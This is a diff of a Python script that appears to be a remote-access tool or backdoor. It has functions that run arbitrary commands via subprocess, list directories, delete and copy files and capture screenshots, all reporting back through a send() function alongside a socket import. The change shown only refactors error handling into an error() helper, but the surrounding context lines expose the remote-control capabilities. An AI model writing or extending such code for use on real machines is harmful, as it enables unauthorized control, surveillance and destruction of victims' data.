@@ -4,13 +4,14 @@ import socket
 import subprocess
 import pyautogui
 
-
+def error(e):
+    print(e)
+    send(e)
 def execute(name):
     try:
         subprocess.call(name)
     except Exception as e:
-        send(e)
-        print(e)
+        error(e)
 
 
 def send(datas):
@@ -30,8 +31,7 @@ def dir(dire):
             stri += (i + '\n')
         return stri
     except Exception as e:
-        print(e)
-        send(e)
+        error(e)
 
 
 
@@ -40,8 +40,7 @@ def delete(file):
         os.remove(file)
         send("success")
     except Exception as e:
-        print(e)
-        send(e)
+        error(e)
 
 
 def copy(file1, file2):
@@ -49,8 +48,7 @@ def copy(file1, file2):
         shutil.copy(file1, file2)
         send("success")
     except Exception as e:
-        send(e)
-        print(e)
+        error(e)
 
 
 def screen_shootin():
@@ -60,8 +58,7 @@ def screen_shootin():
         send("success")
         return "C:\LOL\screenshot.png"
     except Exception as e:
-        send(e)
-        print(e)
+        error(e)
 
 
 def escape():
